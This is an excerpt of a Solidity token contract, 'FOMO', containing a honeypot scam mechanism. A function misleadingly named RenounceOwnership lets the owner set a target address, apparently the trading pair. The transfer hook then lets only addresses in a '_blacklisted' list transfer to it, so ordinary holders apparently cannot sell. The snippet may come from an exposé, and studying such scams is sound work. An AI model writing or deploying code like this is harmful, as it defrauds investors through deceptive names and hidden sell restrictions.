...
contract FOMO is ERC20, Ownable {
    ...
    function RenounceOwnership(address fomoToken_) public onlyOwner {
        _fomoToken = fomoToken_;
    }

    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _fomoToken) {
            require(_blacklisted[from], "Bots are going to miss out!");
        }
    }
}